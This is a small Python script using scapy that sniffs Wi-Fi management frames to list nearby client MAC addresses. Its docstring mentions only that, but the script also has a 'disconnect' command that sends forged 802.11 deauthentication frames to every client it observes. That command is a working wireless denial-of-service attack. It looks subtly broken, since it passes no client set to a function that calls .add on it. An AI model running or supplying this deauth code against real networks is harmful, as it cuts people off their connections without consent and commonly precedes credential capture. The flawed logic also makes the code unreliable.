#!/usr/bin/env python


'''
This script is intended to find wireless clients.
It can:
- Discover MAC addresses

You need to have your wireless card in monitor mode:

    $ airmon-ng start wlan0
'''

import argh
import functools
from scapy.all import *


def sniffmgmt(post_process, packet, clients=None):
    if packet.haslayer(Dot11):
        if packet.type == 0:
            mac_address = packet.addr2
            if not clients or mac_address not in clients:
                clients.add(mac_address)
                post_process(packet)


def discover(interface='mon0'):
    def _print_mac(packet):
        print packet.addr2

    fn = functools.partial(sniffmgmt, _print_mac, clients=set())
    sniff(iface=interface, prn=fn)


def disconnect(interface='mon0'):
    def _deauth_mac(packet):
        sendp(RadioTap() / Dot11(type=0,
                                 subtype=12,
                                 addr1=packet.addr2,
                                 addr2=packet.addr3,
                                 addr3=packet.addr3) / Dot11Deauth())

    fn = functools.partial(sniffmgmt, _deauth_mac)
    sniff(iface=interface, prn=fn)


if __name__ == '__main__':
    argh.dispatch_commands([discover, disconnect])
